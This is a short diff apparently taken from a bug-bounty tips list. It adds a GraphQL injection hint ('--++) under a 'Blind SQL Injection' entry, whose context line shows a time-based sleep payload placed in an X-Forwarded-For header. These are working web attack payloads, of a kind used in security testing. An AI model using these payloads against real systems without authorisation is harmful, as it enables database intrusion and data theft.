@@ -8,3 +8,5 @@ Tips: ```User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.3
 Bug : Blind SQL Injection
 
 Tips : ```X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z```
+
+'--++ on graphql endpoints
